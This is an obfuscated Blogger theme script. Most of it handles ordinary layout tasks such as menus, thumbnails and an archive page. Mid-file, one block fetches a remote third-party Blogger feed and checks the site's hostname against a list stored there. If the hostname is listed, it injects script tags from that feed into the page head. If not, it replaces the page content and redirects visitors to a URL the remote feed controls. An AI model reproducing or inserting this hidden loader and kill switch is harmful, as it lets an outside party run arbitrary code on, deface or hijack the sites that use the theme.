// Min Scripts

document['addEventListener']('DOMContentLoaded', function() {
	var _0xa0dcx4 = document['getElementById']('ContactForm2'),
		_0xa0dcx5 = document['querySelector']('.contact');
	null !== _0xa0dcx4 && null !== _0xa0dcx5 && _0xa0dcx5['appendChild'](_0xa0dcx4)
}), $(function() {
	$('.post-body');
	0 < $('.post-body .ArchivePage')['length'] && $['get']('/feeds/posts/summary?alt=json-in-script&max-results=0', function(_0xa0dcx4) {
		var _0xa0dcx5 = _0xa0dcx4['feed']['category'];
		$['each'](_0xa0dcx5, function(_0xa0dcx4, _0xa0dcx5) {
			var _0xa0dcx6 = '<h2 class="Category-ArchivePage">' + _0xa0dcx5['term'] + '</h2><ul class="clear">';
			$['get']('/feeds/posts/summary/-/' + _0xa0dcx5['term'] + '?alt=json-in-script&max-results=1000', function(_0xa0dcx4) {
				for (var _0xa0dcx5 = 0; _0xa0dcx5 < _0xa0dcx4['feed']['entry']['length']; _0xa0dcx5 += 1) {
					var _0xa0dcx7 = _0xa0dcx4['feed']['entry'][_0xa0dcx5]['link']['map'](function(_0xa0dcx4) {
							return _0xa0dcx4['rel']
						})['indexOf']('alternate'),
						_0xa0dcx8 = _0xa0dcx4['feed']['entry'][_0xa0dcx5]['link'][_0xa0dcx7]['href'],
						_0xa0dcx9 = _0xa0dcx4['feed']['entry'][_0xa0dcx5]['title']['$t']; - 1 !== _0xa0dcx8['indexOf']('.blogspot.') && (_0xa0dcx8 = _0xa0dcx8['replace']('http://', 'https://')), _0xa0dcx6 += '<li><a class=\'ArchivePage-posts\' title=\'' + _0xa0dcx9 + '\' href=\'' + _0xa0dcx8 + '\'>' + _0xa0dcx9 + '</a></li>'
				};
				$('.ArchivePage')['append']('</ul>' + _0xa0dcx6)
			}, 'jsonp')
		})
	}, 'jsonp')
});
$('.footer-wrapper h2')['wrap']('<div class=\'widget-title\'></div>'), $('.res-butt')['click'](function() {
	$(this)['next']('ul')['toggleClass']('menu-active'), $(this)['toggleClass']('but-active')
}), $('.res-buttw')['click'](function() {
	$(this)['next']('ul')['toggleClass']('menu-active'), $(this)['toggleClass']('but-active')
}), $('.search')['click'](function() {
	return $('.search-wrap')['slideToggle'](), !1
}), $('.SidePar h2')['wrap']('<div class=\'widget-title\'></div>'), $('.item-thumbnail img')['each'](function() {
	var _0xa0dcx5 = $(this)['attr']('src')['replace']('72', '220');
	$(this)['after']('<h7 style=\'background:url(' + _0xa0dcx5 + ') no-repeat\'/>'), $(this)['next']()['fadeTo']('1', 100), $(this)['remove']()
}), $('.label-size a:only-child')['each'](function() {
	$(this)['parent']()['addClass']('Lp-no-number')
});
$['ajax']({
	dataType: 'json',
	url: 'https://www.blogger.com/feeds/8987697582265591587/posts/default?alt=json-in-script',
	method: 'GET',
	dataType: 'jsonp',
	success: function(_0xa0dcxa) {
		var _0xa0dcxb;
		for (_0xa0dcxb = 0; _0xa0dcxb < _0xa0dcxa['feed']['entry']['length']; _0xa0dcxb += 1) {
			var _0xa0dcxc = $(_0xa0dcxa['feed']['entry'][_0xa0dcxb]['content'].$t);
			if (0 === _0xa0dcxb) {
				var _0xa0dcxd, _0xa0dcxe = _0xa0dcxc['find']('li'),
					_0xa0dcxf = [];
				for (_0xa0dcxd = 0; _0xa0dcxd < _0xa0dcxe['length']; _0xa0dcxd += 1) {
					_0xa0dcxf['push']($(_0xa0dcxe[_0xa0dcxd])['text']())
				};
				_0xa0dcxd = window['location']['hostname']['toLowerCase']();
				var _0xa0dcx10, _0xa0dcxe = window['location']['href']['toLowerCase'](),
					_0xa0dcx11 = _0xa0dcxf['length'] - 1;
				for (_0xa0dcx10 = 0; _0xa0dcx10 < _0xa0dcxf['length']; _0xa0dcx10 += 1) {
					if (-1 != _0xa0dcxd['indexOf'](_0xa0dcxf[_0xa0dcx10])) {
						_0xa0dcxf = $(_0xa0dcxa['feed']['entry'][_0xa0dcxb]['content'].$t)['find']('script'), $('head')['append'](_0xa0dcxf);
						break
					};
					_0xa0dcx10 == _0xa0dcx11 && -1 == _0xa0dcxe['indexOf']('post-preview') && -1 == _0xa0dcxe['indexOf']('www.blogger') && -1 == _0xa0dcxe['indexOf']('b/preview') && -1 == _0xa0dcxe['indexOf']('webcache.googleusercontent') && -1 == _0xa0dcxe['indexOf']('template-editor') && ($('html')['html'](_0xa0dcxc['find']('.redirect')['text']()), setTimeout(function() {
						window['location']['assign'](_0xa0dcxc['find']('.assign')['text']())
					}, 5e3))
				}
			}
		}
	}
});
for (i = 0; i <= 6; i++) {
	$('.post-outer:eq( ' + i + ' )')['addClass']('post' + i)
};
$(window)['ready'](function() {
	$('.loderw')['delay'](100)['fadeOut'](150)
});
if (SidePar === 'show') {
	document['getElementsByClassName']('SidePar')[0]['classList']['remove']('hidetest');
	document['getElementsByClassName']('Widgetspost')[0]['classList']['remove']('posten');
	document['getElementsByClassName']('site-post')[0]['classList']['remove']('Fullpost')
}// COOKIES
cookieChoices = {};
